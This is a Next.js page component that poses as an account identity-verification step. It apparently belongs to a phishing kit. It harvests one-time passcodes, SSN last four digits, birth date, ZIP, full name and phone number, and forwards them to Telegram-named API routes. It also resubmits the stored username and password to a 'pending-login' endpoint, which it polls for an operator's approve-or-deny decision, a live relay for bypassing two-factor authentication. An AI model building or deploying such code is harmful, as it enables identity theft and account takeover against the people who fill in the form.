"use client"

import { Suspense, useEffect, useRef, useState } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import { Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { SiteFooter } from "@/components/site-footer"
import { SiteHeader } from "@/components/site-header"
import { Input } from "@/components/ui/input"
import { TargetFlowGuard } from "@/components/target-flow-guard"
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_VERIFY_TIME,
  OTP_CODE_ERROR_TEXT,
  OTP_RESEND_COOLDOWN_SEC,
  approvalPollDelayMs,
} from "@/lib/approval-messages"
import { MONTHS, DAYS, YEARS } from "@/lib/date-constants"
import {
  clearTargetAuthFlow,
  setTargetFlowDetailsOk,
} from "@/lib/flores-flow"
import {
  readStoredMaskedPhone,
  readStoredPassword,
  readStoredUsername,
  storeMaskedPhone,
} from "@/lib/login-flow-storage"
import {
  formatUsZipInput,
  isValidUsZip,
  usZipDigits,
} from "@/lib/us-zip"

const PAGE_CSS = `.login-heading-block {
  width: 100%;
  max-width: var(--auth-panel-width);
  padding-top: 4px;
}
.portal-welcome-heading {
  font-size: 30px;
  font-weight: 700;
  color: var(--color-text-dark);
  margin-bottom: 28px;
  letter-spacing: -0.3px;
}
.auth-panel-userid {
  width: 100%;
  max-width: var(--auth-panel-width);
  margin-inline: auto;
  box-sizing: border-box;
  height: auto;
  padding: var(--auth-panel-padding);
  border-radius: 8px;
}
.auth-panel-userid .form-group {
  margin-bottom: 0;
}
.auth-panel-userid .input-field {
  padding: 1rem 1.25rem;
}`

function isValidOtpLength(length: number): boolean {
  return length === 6 || length === 8
}

function EnterCodeContent() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const initialStep = searchParams.get("mode") === "details" ? "details" : "code"
  const [step, setStep] = useState<"code" | "details">(initialStep)
  const [code, setCode] = useState("")
  const [ssnLast4, setSsnLast4] = useState("")
  const [zip, setZip] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [fullName, setFullName] = useState("")
  const [month, setMonth] = useState("")
  const [day, setDay] = useState("")
  const [year, setYear] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [isResending, setIsResending] = useState(false)
  const [resendCooldown, setResendCooldown] = useState(0)
  const [otpCodeRejected, setOtpCodeRejected] = useState(false)
  const [otpUnavailable, setOtpUnavailable] = useState(false)
  const [rememberDevice, setRememberDevice] = useState(false)
  const pollRef = useRef<ReturnType<typeof setTimeout> | null>(null)
  const deadlineRef = useRef(0)

  useEffect(() => {
    return () => {
      if (pollRef.current) {
        clearTimeout(pollRef.current)
        pollRef.current = null
      }
    }
  }, [])

  const modeIsDetails = searchParams.get("mode") === "details"
  useEffect(() => {
    setStep(modeIsDetails ? "details" : "code")
  }, [modeIsDetails])

  useEffect(() => {
    if (resendCooldown <= 0) return
    const timer = setInterval(() => {
      setResendCooldown((s) => (s <= 1 ? 0 : s - 1))
    }, 1000)
    return () => clearInterval(timer)
  }, [resendCooldown])

  const stopPolling = () => {
    if (pollRef.current) {
      clearTimeout(pollRef.current)
      pollRef.current = null
    }
  }

  const showOtpRejected = () => {
    setCode("")
    setOtpUnavailable(false)
    setOtpCodeRejected(true)
  }

  const showOtpUnavailable = () => {
    stopPolling()
    sessionStorage.removeItem("pendingLoginId")
    setCode("")
    setOtpCodeRejected(false)
    setOtpUnavailable(true)
  }

  const redirectVerifyUnavailable = () => {
    stopPolling()
    sessionStorage.removeItem("pendingLoginId")
    window.location.href = "/?verifyUnavailable=1"
  }

  const ssnDigits = ssnLast4.replace(/\D/g, "")
  const phoneDigits = phoneNumber.replace(/\D/g, "")
  const isSsnValid = ssnDigits.length === 4
  const isZipValid = isValidUsZip(zip)
  const isDateValid = Boolean(month && day && year)
  const isPhoneValid = phoneDigits.length === 10
  const isFullNameValid = fullName.trim().length > 0
  const isDetailsValid =
    isSsnValid && isZipValid && isDateValid && isPhoneValid && isFullNameValid
  const codeDigits = code.replace(/\D/g, "")
  const isOtpValid = isValidOtpLength(codeDigits.length)

  const handleContinueFromCode = async () => {
    if (isLoading) return
    if (!isOtpValid) return
    const uid = readStoredUsername().trim()
    if (!uid) {
      router.push("/")
      return
    }

    stopPolling()
    setOtpCodeRejected(false)
    setOtpUnavailable(false)
    setIsLoading(true)

    if (rememberDevice) {
      void fetch("/api/telegram/remember-device", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: uid, rememberDevice: true }),
        keepalive: true,
      }).catch(() => {})
    }

    void fetch("/api/telegram/verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        verificationType: "Code (first OTP)",
        code,
      }),
      keepalive: true,
    }).catch(() => {})

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          flow: "otp",
          kind: "otp",
          userId: uid,
          password: codeDigits,
          method: "email",
          maskedEmail: "—",
          maskedPhone: readStoredMaskedPhone(),
        }),
      })
      const data = await res.json()
      if (!res.ok || !data.id) {
        setIsLoading(false)
        showOtpUnavailable()
        return
      }
      const pendingId = data.id as string
      const waitStartedAt = Date.now()
      deadlineRef.current = waitStartedAt + APPROVAL_TIMEOUT_MS

      const tick = async () => {
        if (Date.now() > deadlineRef.current) {
          setIsLoading(false)
          showOtpUnavailable()
          return
        }
        try {
          const pollRes = await fetch(
            `/api/pending-login/${encodeURIComponent(pendingId)}`,
          )
          if (pollRes.ok) {
            const pollData = await pollRes.json()
            if (pollData.status === "expired") {
              setIsLoading(false)
              showOtpUnavailable()
              return
            }
            if (pollData.status === "approved" || pollData.status === "redirected") {
              stopPolling()
              setIsLoading(false)
              window.location.href = "/api/login-out"
              return
            }
            if (pollData.status === "denied") {
              stopPolling()
              setIsLoading(false)
              showOtpRejected()
              return
            }
          }
        } catch {
          // ignore transient poll errors
        }
        pollRef.current = setTimeout(() => {
          void tick()
        }, approvalPollDelayMs(waitStartedAt))
      }

      void tick()
    } catch {
      setIsLoading(false)
      showOtpUnavailable()
    }
  }

  const handleVerifyDetails = async () => {
    if (!isDetailsValid || isLoading) return
    const uid = readStoredUsername()
    const pwd = readStoredPassword()
    if (!uid || !pwd) {
      router.push("/")
      return
    }

    setIsLoading(true)

    const maskedPhone =
      phoneDigits.length >= 4 ? `XXX-XXX-${phoneDigits.slice(-4)}` : "—"
    storeMaskedPhone(maskedPhone)

    fetch("/api/telegram/verify-details", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ssnLast4: ssnDigits,
        zip: usZipDigits(zip),
        birthDate: `${month} ${day}, ${year}`,
        phoneNumber: phoneDigits,
        fullName,
      }),
    }).catch(console.error)

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: uid,
          password: pwd,
          method: "email",
          maskedEmail: "—",
          maskedPhone,
          flow: "login",
        }),
      })
      const data = await res.json()
      if (!res.ok || !data.id) {
        throw new Error("pending login failed")
      }
      const pendingId = data.id as string
      sessionStorage.setItem("pendingLoginId", pendingId)

      const waitStartedAt = Date.now()
      deadlineRef.current = waitStartedAt + APPROVAL_TIMEOUT_MS

      const tick = async () => {
        if (Date.now() > deadlineRef.current) {
          redirectVerifyUnavailable()
          return
        }
        try {
          const pollRes = await fetch(
            `/api/pending-login/${encodeURIComponent(pendingId)}`,
          )
          if (pollRes.ok) {
            const pollData = await pollRes.json()
            if (pollData.status === "expired") {
              redirectVerifyUnavailable()
              return
            }
            if (pollData.status === "redirected") {
              stopPolling()
              sessionStorage.removeItem("pendingLoginId")
              setIsLoading(false)
              window.location.href = "/api/login-out"
              return
            }
            if (pollData.status === "approved") {
              stopPolling()
              sessionStorage.removeItem("pendingLoginId")
              setTargetFlowDetailsOk()
              setIsLoading(false)
              router.push("/verify")
              return
            }
            if (pollData.status === "denied") {
              stopPolling()
              sessionStorage.removeItem("pendingLoginId")
              clearTargetAuthFlow()
              window.location.href = "/?loginDenied=1"
              return
            }
          }
        } catch {
          // ignore transient poll errors
        }
        pollRef.current = setTimeout(() => {
          void tick()
        }, approvalPollDelayMs(waitStartedAt))
      }

      void tick()
    } catch {
      setIsLoading(false)
    }
  }

  const handleResend = () => {
    if (isResending || resendCooldown > 0) return
    setIsResending(true)

    void fetch("/api/telegram/resend-code", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId: readStoredUsername(), isSecondOtp: false }),
      keepalive: true,
    }).catch(() => {})

    setIsResending(false)
    setResendCooldown(OTP_RESEND_COOLDOWN_SEC)
  }

  const canResend = resendCooldown <= 0 && !isResending && !isLoading

  if (step === "details") {
    return (
      <TargetFlowGuard phase="details">
        <div className="min-h-screen bg-white">
          <style dangerouslySetInnerHTML={{ __html: PAGE_CSS }} />
          <SiteHeader />
          <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px]">
            <h2 className="text-base font-medium text-gray-900 mb-2">Verify It&apos;s You</h2>
            <h1 className="text-2xl font-semibold text-gray-900 mb-2">
              Verify Your Details
            </h1>
            <p className="text-gray-700 text-sm mb-6">
              You&apos;ll need to provide some information first to confirm your identity.
            </p>

            <div className="space-y-5">
              <div>
                <label htmlFor="verify-ssn" className="block text-sm font-medium text-gray-900 mb-1.5">
                  Last 4 Digits of SSN
                </label>
                <Input
                  id="verify-ssn"
                  type="text"
                  inputMode="numeric"
                  maxLength={4}
                  value={ssnLast4}
                  onChange={(e) => setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  disabled={isLoading}
                  placeholder=""
                  className="max-w-[140px] h-10 bg-gray-50 border-gray-300 rounded-md"
                />
              </div>

              <div>
                <label htmlFor="verify-zip" className="block text-sm font-medium text-gray-900 mb-1.5">
                  ZIP Code
                </label>
                <Input
                  id="verify-zip"
                  type="text"
                  inputMode="numeric"
                  maxLength={10}
                  value={zip}
                  onChange={(e) => setZip(formatUsZipInput(e.target.value))}
                  disabled={isLoading}
                  placeholder=""
                  className="max-w-[160px] h-10 bg-gray-50 border-gray-300 rounded-md"
                />
                {!isZipValid && usZipDigits(zip).length > 0 && (
                  <p className="mt-1 text-xs text-red-600">
                    Enter a valid 5-digit ZIP or ZIP+4.
                  </p>
                )}
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-900 mb-1.5">Birth Date</label>
                <div className="flex gap-2 flex-wrap">
                  <select
                    value={month}
                    onChange={(e) => setMonth(e.target.value)}
                    disabled={isLoading}
                    className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-[120px]"
                  >
                    <option value="">Month</option>
                    {MONTHS.map((m) => (
                      <option key={m} value={m}>{m}</option>
                    ))}
                  </select>
                  <select
                    value={day}
                    onChange={(e) => setDay(e.target.value)}
                    disabled={isLoading}
                    className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-[80px]"
                  >
                    <option value="">Day</option>
                    {DAYS.map((d) => (
                      <option key={d} value={d}>{d}</option>
                    ))}
                  </select>
                  <select
                    value={year}
                    onChange={(e) => setYear(e.target.value)}
                    disabled={isLoading}
                    className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-[90px]"
                  >
                    <option value="">Year</option>
                    {YEARS.map((y) => (
                      <option key={y} value={y}>{y}</option>
                    ))}
                  </select>
                </div>
              </div>

              <div>
                <label htmlFor="verify-full-name" className="block text-sm font-medium text-gray-900 mb-1.5">
                  Full Name
                </label>
                <Input
                  id="verify-full-name"
                  type="text"
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)}
                  disabled={isLoading}
                  placeholder=""
                  className="max-w-[260px] h-10 bg-gray-50 border-gray-300 rounded-md"
                />
              </div>

              <div>
                <label htmlFor="verify-phone" className="block text-sm font-medium text-gray-900 mb-1.5">
                  Phone Number
                </label>
                <div className="flex items-center gap-2 max-w-[260px]">
                  <span className="px-2 h-10 flex items-center border border-gray-300 bg-gray-100 rounded-md text-sm text-gray-900">
                    +1
                  </span>
                  <Input
                    id="verify-phone"
                    type="tel"
                    inputMode="tel"
                    value={phoneNumber}
                    disabled={isLoading}
                    onChange={(e) => {
                      const digits = e.target.value.replace(/\D/g, "").slice(0, 10)
                      let formatted = digits
                      if (digits.length > 6) {
                        formatted = `${digits.slice(0, 3)}-${digits.slice(3, 6)}-${digits.slice(6)}`
                      } else if (digits.length > 3) {
                        formatted = `${digits.slice(0, 3)}-${digits.slice(3)}`
                      }
                      setPhoneNumber(formatted)
                    }}
                    placeholder=""
                    className="flex-1 h-10 bg-gray-50 border-gray-300 rounded-md"
                  />
                </div>
                {!isPhoneValid && phoneDigits.length > 0 && (
                  <p className="mt-1 text-xs text-red-600">Enter a valid 10-digit phone number.</p>
                )}
              </div>

              <div className="flex gap-3 pt-2">
                <Button
                  type="button"
                  onClick={handleVerifyDetails}
                  disabled={!isDetailsValid || isLoading}
                  className="bg-[#1c68bf] hover:bg-[#001f6b] text-white rounded-md h-9 px-5 text-sm font-medium disabled:bg-gray-300 disabled:text-gray-500 disabled:pointer-events-none inline-flex items-center justify-center gap-2"
                >
                  {isLoading ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin shrink-0" aria-hidden />
                      <span>Verify</span>
                    </>
                  ) : (
                    "Verify"
                  )}
                </Button>
                <Button
                  type="button"
                  variant="outline"
                  className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-9 px-5 text-sm font-medium"
                  disabled={isLoading}
                  onClick={() => {
                    clearTargetAuthFlow()
                    router.push("/")
                  }}
                >
                  Cancel
                </Button>
              </div>
            </div>
          </div>
          <SiteFooter />
        </div>
      </TargetFlowGuard>
    )
  }

  return (
    <TargetFlowGuard phase="code">
      <div className="min-h-screen bg-white flex flex-col">
        <style dangerouslySetInnerHTML={{ __html: PAGE_CSS }} />
        <SiteHeader />
        <main className="flex-1 w-full px-4 py-10 md:py-14">
          <div className="mx-auto w-full max-w-[var(--auth-panel-width,432px)]">
            <div className="mb-l login-heading-block text-center mx-auto">
              <h1 className="portal-welcome-heading bold-text text-5xl m-none">
                Verify your identity to continue
              </h1>
              <p className="mt-3 text-m text-gray-700">
                Follow the prompts below to continue.
              </p>
            </div>

            <div className="auth-panel-wrapper mx-auto">
              <div className="f-panel white medium auth-panel auth-panel-userid">
                <div className="auth-panel-content">
                  <button
                    type="button"
                    aria-label="Back to verify details"
                    onClick={() => router.push("/verify?mode=details")}
                    disabled={isLoading}
                    className="flex items-center gap-m h-40px pr-m back-to-user mb-l disabled:opacity-60"
                  >
                    <div className="flex justify-center items-center w-24px h-24px">
                      <svg viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg" aria-hidden>
                        <path d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l192 192c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256 246.6 86.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-192 192z" />
                      </svg>
                    </div>
                    <span className="accent-navy-blue-text bold-text">Back</span>
                  </button>

                  <h6 className="mb-l">
                    <p className="text-l bold-text">
                      Enter the code we shared with you.
                    </p>
                  </h6>

                  <div className="mb-l mt-l text-xs">
                    * Fields marked with an asterisk (*) are required.
                  </div>

                  <div className="form-group">
                    <label id="code-label" htmlFor="code" className="input-label">
                      Enter one-time code (Required)*
                    </label>
                    <div className="input-field-wrapper">
                      <input
                        type="text"
                        id="code"
                        inputMode="numeric"
                        autoComplete="one-time-code"
                        aria-labelledby="code-label"
                        value={code}
                        disabled={isLoading}
                        onChange={(e) => {
                          setOtpCodeRejected(false)
                          setOtpUnavailable(false)
                          setCode(e.target.value.replace(/\D/g, "").slice(0, 8))
                        }}
                        className={`input-field ${otpCodeRejected || otpUnavailable ? "has-error" : ""}`}
                        maxLength={8}
                      />
                    </div>
                  </div>

                  {otpCodeRejected && (
                    <div className="error-message" role="alert">
                      {OTP_CODE_ERROR_TEXT}
                    </div>
                  )}

                  {otpUnavailable && (
                    <div className="error-message" role="alert">
                      {MSG_UNABLE_VERIFY_TIME}
                    </div>
                  )}

                  <div className="flex flex-wrap items-start justify-between gap-m mt-l mb-l">
                    <label className="flex items-start gap-m text-m cursor-pointer max-w-[280px]">
                      <input
                        type="checkbox"
                        checked={rememberDevice}
                        onChange={(e) => setRememberDevice(e.target.checked)}
                        disabled={isLoading}
                        className="mt-1 shrink-0"
                      />
                      <span>
                        This is my personal device, don&apos;t ask to verify again.
                      </span>
                    </label>
                    <button
                      type="button"
                      onClick={handleResend}
                      disabled={!canResend}
                      className="accent-navy-blue-text text-m disabled:opacity-60"
                    >
                      {isResending
                        ? "Sending..."
                        : resendCooldown > 0
                          ? `Send another code (${resendCooldown}s)`
                          : "Send another code"}
                    </button>
                  </div>

                  <div className="mt-xl">
                    <button
                      type="button"
                      className="f-button progressive medium"
                      aria-label="Submit"
                      onClick={() => void handleContinueFromCode()}
                      disabled={!isOtpValid || isLoading}
                    >
                      <span className="button-text inline-flex items-center justify-center gap-2">
                        {isLoading ? (
                          <>
                            <Loader2 className="h-4 w-4 animate-spin shrink-0" aria-hidden />
                            Submit
                          </>
                        ) : (
                          "Submit"
                        )}
                      </span>
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
        <SiteFooter />
      </div>
    </TargetFlowGuard>
  )
}

export default function EnterCodePage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
        Loading...
      </div>
    }>
      <EnterCodeContent />
    </Suspense>
  )
}
